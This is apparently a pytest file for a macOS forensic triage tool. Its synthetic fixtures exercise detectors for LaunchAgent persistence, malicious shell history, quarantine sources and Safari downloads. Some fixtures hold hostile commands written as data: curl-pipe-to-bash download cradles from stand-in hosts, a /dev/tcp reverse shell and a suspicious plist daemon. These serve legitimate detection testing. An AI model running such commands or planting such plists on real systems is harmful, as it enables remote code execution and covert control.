"""macOS forensicator + triage tests.

Synthetic plist / SQLite fixtures exercise every detector; a skip-
gated smoke test runs against the BigSur Data volume when mounted.
"""
import plistlib
import sqlite3
from pathlib import Path

import pytest

from el.skills import macos_triage as mt


# ---------------------------------------------------------------------------
# Detector 1: LaunchAgent / LaunchDaemon plist persistence
# ---------------------------------------------------------------------------

def _write_plist(path: Path, doc: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as f:
        plistlib.dump(doc, f)


def test_launch_agent_in_tmp_flagged(tmp_path):
    _write_plist(tmp_path / "Library" / "LaunchAgents"
                  / "com.attacker.agent.plist",
                  {"Label": "com.attacker.agent",
                   "ProgramArguments": ["/tmp/.hidden/run"],
                   "RunAtLoad": True})
    hits = mt.detect_launch_persistence_suspicious_path(tmp_path)
    assert hits
    assert hits[0].family == "launch_persistence_suspicious"
    assert ("T1543.001", "Create or Modify System Process: Launch Agent") \
        in hits[0].attack


def test_launch_daemon_shell_cradle_flagged(tmp_path):
    _write_plist(tmp_path / "Library" / "LaunchDaemons"
                  / "com.evil.daemon.plist",
                  {"Label": "com.evil",
                   "ProgramArguments":
                       ["/bin/bash", "-c",
                        "curl -s http://evil.tld/a.sh | bash"]})
    hits = mt.detect_launch_persistence_suspicious_path(tmp_path)
    assert hits


def test_launch_agent_legit_path_silent(tmp_path):
    _write_plist(tmp_path / "Library" / "LaunchAgents"
                  / "com.vmware.launchd.vmware-tools-userd.plist",
                  {"Label": "com.vmware",
                   "ProgramArguments":
                       ["/Library/Application Support/VMware Tools/"
                        "vmware-tools-daemon"]})
    assert mt.detect_launch_persistence_suspicious_path(tmp_path) == []


def test_launch_agent_user_scope_also_walked(tmp_path):
    _write_plist(tmp_path / "Users" / "alice" / "Library"
                  / "LaunchAgents" / "com.evil.plist",
                  {"Label": "com.evil",
                   "Program": "/Users/Shared/.b/runner"})
    hits = mt.detect_launch_persistence_suspicious_path(tmp_path)
    assert hits


def test_launch_no_plists_no_hits(tmp_path):
    assert mt.detect_launch_persistence_suspicious_path(tmp_path) == []


# ---------------------------------------------------------------------------
# Detector 2: shell history (delegated macOS path -> Users/<user>/)
# ---------------------------------------------------------------------------

def test_shell_history_mimikatz_variant(tmp_path):
    (tmp_path / "Users" / "alice").mkdir(parents=True)
    (tmp_path / "Users" / "alice" / ".bash_history").write_text(
        "curl -sSL http://1.2.3.4/x | bash\n"
    )
    hits = mt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "shell_history_download_cradle" for h in hits)


def test_shell_history_reverse_shell(tmp_path):
    (tmp_path / "Users" / "alice").mkdir(parents=True)
    (tmp_path / "Users" / "alice" / ".zsh_history").write_text(
        "bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n"
    )
    hits = mt.detect_shell_history_malicious(tmp_path)
    assert any(h.family == "shell_history_reverse_shell" for h in hits)


def test_shell_history_clean_no_hits(tmp_path):
    (tmp_path / "Users" / "alice").mkdir(parents=True)
    (tmp_path / "Users" / "alice" / ".zsh_history").write_text(
        "ls\ncd Documents\nvim notes.md\n"
    )
    assert mt.detect_shell_history_malicious(tmp_path) == []


def test_shell_history_no_users_dir_no_hits(tmp_path):
    assert mt.detect_shell_history_malicious(tmp_path) == []


# ---------------------------------------------------------------------------
# Detector 3: quarantine unusual source
# ---------------------------------------------------------------------------

def _quarantine_db(path: Path, rows: list[tuple[str, str, str]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(path))
    conn.execute("""
        CREATE TABLE LSQuarantineEvent (
            LSQuarantineEventIdentifier TEXT,
            LSQuarantineTimeStamp REAL,
            LSQuarantineAgentBundleIdentifier TEXT,
            LSQuarantineAgentName TEXT,
            LSQuarantineDataURLString TEXT,
            LSQuarantineSenderName TEXT,
            LSQuarantineSenderAddress TEXT,
            LSQuarantineTypeNumber INTEGER,
            LSQuarantineOriginTitle TEXT,
            LSQuarantineOriginURLString TEXT
        )
    """)
    for agent, origin, data_url in rows:
        conn.execute(
            "INSERT INTO LSQuarantineEvent "
            "(LSQuarantineAgentName, LSQuarantineOriginURLString, "
            "LSQuarantineDataURLString) VALUES (?, ?, ?)",
            (agent, origin, data_url),
        )
    conn.commit()
    conn.close()


def test_quarantine_raw_ip_url_flagged(tmp_path):
    qe = (tmp_path / "Users" / "alice" / "Library" / "Preferences"
          / "com.apple.LaunchServices.QuarantineEventsV2")
    _quarantine_db(qe, [("Safari", "http://203.0.113.10/payload.zip",
                          "http://203.0.113.10/payload.zip")])
    hits = mt.detect_quarantine_unusual_source(tmp_path)
    assert hits
    assert hits[0].family == "quarantine_unusual_source"


def test_quarantine_suspicious_tld_flagged(tmp_path):
    qe = (tmp_path / "Users" / "alice" / "Library" / "Preferences"
          / "com.apple.LaunchServices.QuarantineEventsV2")
    _quarantine_db(qe, [("Safari", "https://malicious.top/x.dmg", "")])
    assert mt.detect_quarantine_unusual_source(tmp_path)


def test_quarantine_legit_tld_silent(tmp_path):
    qe = (tmp_path / "Users" / "alice" / "Library" / "Preferences"
          / "com.apple.LaunchServices.QuarantineEventsV2")
    _quarantine_db(qe, [("Safari", "https://github.com/x/y/release", ""),
                         ("Safari", "https://www.apple.com/downloads", "")])
    assert mt.detect_quarantine_unusual_source(tmp_path) == []


def test_quarantine_no_db_no_hits(tmp_path):
    assert mt.detect_quarantine_unusual_source(tmp_path) == []


# ---------------------------------------------------------------------------
# Detector 4: Safari Downloads.plist
# ---------------------------------------------------------------------------

def test_safari_downloads_tmp_target_flagged(tmp_path):
    _write_plist(tmp_path / "Users" / "alice" / "Library" / "Safari"
                  / "Downloads.plist",
                  {"DownloadHistory": [
                      {"DownloadEntryPath": "/private/tmp/evil.dmg",
                       "DownloadEntryURL": "https://example.com/x.dmg"},
                  ]})
    hits = mt.detect_safari_downloads_plist_suspicious(tmp_path)
    assert hits


def test_safari_downloads_raw_ip_url_flagged(tmp_path):
    _write_plist(tmp_path / "Users" / "alice" / "Library" / "Safari"
                  / "Downloads.plist",
                  {"DownloadHistory": [
                      {"DownloadEntryPath": "/Users/alice/Downloads/x.dmg",
                       "DownloadEntryURL": "http://203.0.113.10/x.dmg"},
                  ]})
    hits = mt.detect_safari_downloads_plist_suspicious(tmp_path)
    assert hits


def test_safari_downloads_legit_silent(tmp_path):
    _write_plist(tmp_path / "Users" / "alice" / "Library" / "Safari"
                  / "Downloads.plist",
                  {"DownloadHistory": [
                      {"DownloadEntryPath": "/Users/alice/Downloads/a.dmg",
                       "DownloadEntryURL": "https://www.apple.com/x.dmg"},
                  ]})
    assert mt.detect_safari_downloads_plist_suspicious(tmp_path) == []


# ---------------------------------------------------------------------------
# run_all wiring
# ---------------------------------------------------------------------------

def test_run_all_empty_dir(tmp_path):
    assert mt.run_all(tmp_path) == []


def test_run_all_combines_families(tmp_path):
    _write_plist(tmp_path / "Library" / "LaunchDaemons" / "evil.plist",
                  {"ProgramArguments": ["/tmp/b/run"]})
    (tmp_path / "Users" / "alice").mkdir(parents=True)
    (tmp_path / "Users" / "alice" / ".bash_history").write_text(
        "wget http://1.2.3.4/x\n"
    )
    hits = mt.run_all(tmp_path)
    families = {h.family for h in hits}
    assert "launch_persistence_suspicious" in families
    assert "shell_history_download_cradle" in families


def test_hypotheses_for_map():
    # Mac launch-daemon persistence now lifts the platform-specific
    # H_MAC_LAUNCH_DAEMON_PERSISTENCE alongside H_APT_ESPIONAGE — the
    # generic H_PERSISTENCE_SERVICE was a Windows-shaped tag and
    # didn't ACH-rank correctly when paired with Mac-only evidence.
    assert "H_MAC_LAUNCH_DAEMON_PERSISTENCE" in mt.hypotheses_for(
        "launch_persistence_suspicious")
    assert "H_APT_ESPIONAGE" in mt.hypotheses_for(
        "launch_persistence_suspicious")
    assert mt.hypotheses_for("nonexistent") == []


# ---------------------------------------------------------------------------
# Agent wiring
# ---------------------------------------------------------------------------

def test_agent_emits_finding_on_hit(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.macos_forensicator import MacOSForensicatorAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "disk.E01"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-mac-hit")
    with open_ledger(m.case_dir):
        pass
    exports = Path(m.case_dir) / "exports" / "macos-artifacts"
    _write_plist(exports / "Library" / "LaunchDaemons" / "evil.plist",
                  {"ProgramArguments": ["/tmp/.b/run"]})

    ctx = AgentContext(case_id="t-mac-hit", case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__,
                       shared={"macos_artifacts_dir": str(exports)})
    findings = MacOSForensicatorAgent().run(ctx)
    persist = [f for f in findings
               if "launch_persistence_suspicious" in f.claim]
    assert persist and persist[0].confidence == "high"
    assert "H_MAC_LAUNCH_DAEMON_PERSISTENCE" in persist[0].hypotheses_supported


def test_agent_insufficient_when_no_exports(tmp_path, monkeypatch):
    from el.agents.base import AgentContext
    from el.agents.macos_forensicator import MacOSForensicatorAgent
    from el.evidence import intake as intake_mod
    from el.evidence.ledger import open_ledger

    monkeypatch.setattr(intake_mod, "CASE_ROOT", tmp_path / "cases")
    src = tmp_path / "x"; src.write_bytes(b"x")
    m = intake_mod.intake(src, case_id="t-mac-nope")
    with open_ledger(m.case_dir):
        pass
    ctx = AgentContext(case_id="t-mac-nope",
                       case_dir=Path(m.case_dir),
                       input_path=src, manifest=m.__dict__)
    findings = MacOSForensicatorAgent().run(ctx)
    assert findings and findings[0].confidence == "insufficient"


# ---------------------------------------------------------------------------
# Real-data smoke (skipped unless BigSur APFS is mounted)
# ---------------------------------------------------------------------------

_BIGSUR = Path("/tmp/el-mounts/macos-data")


@pytest.mark.skipif(
    not (_BIGSUR.is_dir() and (_BIGSUR / "Users").exists()),
    reason="BigSur APFS not mounted at /tmp/el-mounts/macos-data",
)
def test_bigsur_extraction_runs(tmp_path):
    from el.skills.macos_artifacts import extract_macos_artifacts
    extracted = extract_macos_artifacts(_BIGSUR, tmp_path)
    assert any(v > 0 for v in extracted.values())
    hits = mt.run_all(tmp_path)
    # Whatever the result — must not raise, and must be a list
    assert isinstance(hits, list)
